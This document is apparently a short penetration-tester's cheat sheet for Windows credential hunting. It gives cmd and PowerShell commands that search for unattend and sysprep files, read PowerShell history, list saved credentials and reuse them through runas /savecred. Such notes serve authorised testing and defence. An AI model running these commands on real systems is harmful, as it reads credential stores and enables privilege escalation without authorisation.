# File-Unattended ✅
## cmd ✡️
```cmd
dir C:\sysprep.inf /s /p
dir C:\sysprep.xml /s /p
dir C:\unattend.xml /s /p
```
## powershell ✡️
```powershell
Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
```
# Powershell History ✅
## cmd ✡️
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
```
## powershell ✡️
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
```
# Saved Windows Credentials ✅
```powershell
cmdkey /list # show save user credentials
runas /savecred /user:<username> cmd.exe # run cmd with another user 
runas /savecred /user:<username> powershell.exe # run powershell with another user
```
